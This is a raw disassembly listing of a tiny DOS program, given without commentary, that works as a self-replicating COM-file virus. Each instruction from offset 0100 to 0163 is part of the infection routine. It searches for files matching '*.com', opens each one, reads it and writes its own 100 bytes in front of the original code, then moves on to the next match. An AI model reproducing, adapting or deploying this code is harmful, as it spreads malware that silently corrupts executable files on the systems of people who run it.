0B36:0100 56            PUSH    SI
0B36:0101 56            PUSH    SI
0B36:0102 5F            POP     DI
0B36:0103 8CC8          MOV     AX,CS
0B36:0105 FEC4          INC     AH
0B36:0107 8EC0          MOV     ES,AX
0B36:0109 B164          MOV     CL,64
0B36:010B F3            REPZ
0B36:010C A4            MOVSB
0B36:010D 5E            POP     SI
0B36:010E B44E          MOV     AH,4E
0B36:0110 BA5E01        MOV     DX,015E
0B36:0113 CD21          INT     21
0B36:0115 7316          JNB     012D
0B36:0117 56            PUSH    SI
0B36:0118 06            PUSH    ES
0B36:0119 0E            PUSH    CS
0B36:011A 07            POP     ES
0B36:011B 87FE          XCHG    DI,SI
0B36:011D B99BFE        MOV     CX,FE9B
0B36:0120 B82501        MOV     AX,0125
0B36:0123 50            PUSH    AX
0B36:0124 CB            RETF
0B36:0125 F3            REPZ
0B36:0126 A4            MOVSB
0B36:0127 5E            POP     SI
0B36:0128 06            PUSH    ES
0B36:0129 06            PUSH    ES
0B36:012A 1F            POP     DS
0B36:012B 56            PUSH    SI
0B36:012C CB            RETF
0B36:012D 92            XCHG    DX,AX
0B36:012E B8023D        MOV     AX,3D02
0B36:0131 B29E          MOV     DL,9E
0B36:0133 CD21          INT     21
0B36:0135 93            XCHG    BX,AX
0B36:0136 06            PUSH    ES
0B36:0137 1F            POP     DS
0B36:0138 B43F          MOV     AH,3F
0B36:013A 57            PUSH    DI
0B36:013B 5A            POP     DX
0B36:013C 33C9          XOR     CX,CX
0B36:013E 51            PUSH    CX
0B36:013F 49            DEC     CX
0B36:0140 CD21          INT     21
0B36:0142 056400        ADD     AX,0064
0B36:0145 59            POP     CX
0B36:0146 50            PUSH    AX
0B36:0147 B80042        MOV     AX,4200
0B36:014A 99            CWD
0B36:014B CD21          INT     21
0B36:014D B440          MOV     AH,40
0B36:014F 59            POP     CX
0B36:0150 56            PUSH    SI
0B36:0151 5A            POP     DX
0B36:0152 CD21          INT     21
0B36:0154 0E            PUSH    CS
0B36:0155 1F            POP     DS
0B36:0156 B43E          MOV     AH,3E
0B36:0158 CD21          INT     21
0B36:015A B44F          MOV     AH,4F
0B36:015C EBB5          JMP     0113
0B36:015E 2A2E636F      SUB     CH,[6F63]
0B36:0162 6D            DB      6D
0B36:0163 00            DB      00
